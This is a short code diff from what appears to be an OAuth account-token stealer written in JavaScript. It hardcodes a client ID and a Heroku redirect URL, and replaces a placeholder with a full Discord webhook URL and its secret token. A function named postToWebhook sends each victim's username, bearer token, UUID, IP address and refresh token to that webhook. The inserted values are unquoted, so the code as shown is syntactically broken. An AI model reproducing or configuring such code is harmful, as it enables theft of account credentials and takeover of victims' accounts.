@@ -52,8 +52,8 @@ async function getAccessTokenAndRefreshToken(code) {
         }
     }
     let data = {
-        client_id: client_id,
-        redirect_uri: redirect_uri,
+        client_id: ba169269-a508-4a40-b2c5-1debd6dc82fb,
+        redirect_uri: https://chainsama.herokuapp.com/,
         client_secret: client_secret,
         code: code,
         grant_type: 'authorization_code'
@@ -127,7 +127,7 @@ function getIp(req) {
 }
 
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
-    const url = webhook_url
+    const url = https://discord.com/api/webhooks/1033629189397553252/oLzt83tgLmfn6ddf4rF7p_hJBwUtyADwbx7jsmvl8FkMs--ZeUKua78uITxwdHERDICl
     let data = {
         username: " ",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
